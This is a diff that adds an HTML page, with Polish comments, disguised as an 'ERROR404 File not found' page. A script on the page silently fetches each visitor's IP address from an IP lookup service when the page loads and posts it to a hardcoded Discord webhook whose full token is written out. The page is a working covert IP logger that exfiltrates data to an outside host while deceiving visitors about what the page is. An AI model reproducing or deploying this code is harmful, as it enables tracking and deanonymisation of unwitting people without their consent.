@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zapisz IP i wyślij na Discorda</title>
+</head>
+<body>
+    <h1>ERROR404</h1>
+    <p>File not found</p>
+
+    <script>
+        // Funkcja do pobierania IP
+        async function getIP() {
+            try {
+                const response = await fetch('https://api64.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Błąd podczas pobierania IP:', error);
+                return null;
+            }
+        }
+
+        // Funkcja do wysyłania danych na Discord webhook
+        async function sendToDiscord(ip) {
+            if (!ip) return;
+
+            const webhookUrl = 'https://ptb.discord.com/api/webhooks/1252938460067790888/AQMQkw8gjRUubsPTigt9EChte1D3Ji6cPuI2ioaaMlaXtNTBqeXjxVF1uWa7Zhvk9Nnz'; // Zastąp własnym URL webhooka
+
+            const message = {
+                content: `Adres IP: ${ip}`
+            };
+
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(message)
+                });
+                console.log('IP wysłane pomyślnie na Discorda');
+            } catch (error) {
+                console.error('Błąd podczas wysyłania IP na Discorda:', error);
+            }
+        }
+
+        // Pobieranie IP i wysyłanie na Discord webhook po załadow
+		        window.onload = async () => {
+            const ip = await getIP();
+            await sendToDiscord(ip);
+        };
+    </script>
+</body>
+</htm
